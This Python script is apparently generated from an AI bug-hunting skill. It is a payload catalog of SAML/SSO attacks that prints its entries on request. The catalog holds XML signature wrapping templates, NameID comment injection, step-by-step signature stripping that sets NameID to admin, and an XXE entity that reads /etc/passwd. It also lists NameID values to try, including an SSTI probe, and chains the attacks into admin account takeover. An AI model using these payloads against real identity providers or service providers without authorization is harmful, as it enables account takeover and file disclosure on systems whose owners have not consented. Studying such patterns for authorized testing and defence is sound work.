#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-saml

Skill: Find SAML endpoints
Desc : Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation.

Run:  python claude-bughunter-hunt-saml.py --help
      python claude-bughunter-hunt-saml.py --list
      python claude-bughunter-hunt-saml.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-saml'
TITLE = 'Find SAML endpoints'
DESCRIPTION = "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."

PAYLOADS = {
    'main': ["name: hunt-saml", "description: \"Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) \u2014 modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com \u2192 some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation.\""],
    '20-saml-sso-attacks': [],
    'attack-surface': ["```bash"],
    'find-saml-endpoints': ["cat recon/$TARGET/urls.txt | grep -iE \"saml|sso|login.*redirect|oauth|idp|sp\""],
    'key-endpoints-saml-acs-assertion-consumer-service-sso-saml-auth-saml-callback': [],
    'attack-1-xml-signature-wrapping-xsw': ["```xml", "<!-- BEFORE: valid assertion by user@company.com -->", "<saml:Response>", "<saml:Assertion ID=\"legit\">", "<NameID>user@company.com</NameID>", "<ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>", "</saml:Assertion>", "</saml:Response>", "<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).", "App processes the FIRST assertion found = evil. -->", "<saml:Response>", "<saml:Assertion ID=\"evil\">", "<NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->", "</saml:Assertion>", "<saml:Assertion ID=\"legit\">", "<NameID>user@company.com</NameID>", "<ds:Signature><!-- Valid --></ds:Signature>", "</saml:Assertion>", "</saml:Response>"],
    'attack-2-comment-injection-in-nameid': ["```xml", "<!-- Attacker registers/controls account: admin@company.com.evil.com -->", "<NameID>admin@company.com<!---->.evil.com</NameID>", "<!-- Signed canonical form (C14N without-comments strips the comment BEFORE", "digest): \"admin@company.com.evil.com\" \u2014 the value the signature covers. -->", "<!-- App's XML processor also strips the comment but only reads the text node", "UP TO the comment boundary: \"admin@company.com\" \u2014 a DIFFERENT effective", "identity than was signed. The discrepancy is the bug. -->", "<!-- Works when signer's C14N and app's text extraction disagree on comments.", "CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->"],
    'attack-3-signature-stripping': ["1. Decode SAMLResponse: echo \"BASE64\" | base64 -d | xmllint --format - > saml.xml", "2. Delete the entire <Signature> element", "3. Change NameID to admin@company.com", "4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE \u2014 not gzip)", "5. Submit \u2014 if server doesn't verify signature presence = admin ATO"],
    'attack-4-xxe-in-saml-assertion': ["```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<saml:Assertion>", "<NameID>&xxe;</NameID>", "</saml:Assertion>"],
    'attack-5-nameid-manipulation': ["Test these NameID values:", "- admin@company.com (generic admin)", "- administrator@company.com", "- support@target.com", "- Any email found in disclosed reports for this program", "- ${7*7} (SSTI if NameID gets rendered in a template)"],
    'tools': ["```bash"],
    'samlraider-burp-extension-automated-xsw-testing': [],
    'bapp-store-samlraider-intercept-samlresponse-saml-raider-tab': [],
    'manual-workflow': ["echo \"BASE64_SAML\" | base64 -d > saml.xml"],
    'edit-saml-xml': ["base64 -w0 saml.xml  # Re-encode"],
    'url-encode-the-result-before-sending-as-samlresponse-parameter': [],
    'saml-triage': ["XSW successful   = Critical (ATO any user)", "Sig stripping    = Critical (ATO any user)", "Comment injection = High (ATO admin)", "XXE in assertion = High (file read / SSRF)", "NameID manip     = Medium/High (depends on what NameID maps to)"],
    'related-skills-chains': ["- **`hunt-ato`** \u2014 SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B \u2192 admin ATO across federated tenant boundary.", "- **`hunt-auth-bypass`** \u2014 SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse \u2192 regex-strip `<ds:Signature>` element entirely \u2192 modify `<NameID>` to admin \u2192 re-encode base64 \u2192 POST to `/saml/acs` \u2192 SP wantAssertionsSigned=false silently accepts \u2192 admin session issued without any cryptographic challenge.", "- **`hunt-oauth`** \u2014 SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin \u2192 SP's token endpoint issues OAuth token bearing admin claims \u2192 all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.", "- **`hunt-xxe`** \u2014 SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>` in assertion + `<NameID>&xxe;</NameID>` \u2192 SP renders/logs NameID \u2192 /etc/passwd contents leak in error response or audit log \u2192 file-read primitive on SAML SP infrastructure.", "- **`security-arsenal`** \u2014 Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for \"SAMLResponse accepted on the wrong endpoint\" claims that don't actually validate.", "- **`triage-validation`** \u2014 Run the Pre-Severity Gate before claiming Critical on a SAML \"vulnerability\" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical \u2014 the auth-decision-changing step is the gate."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()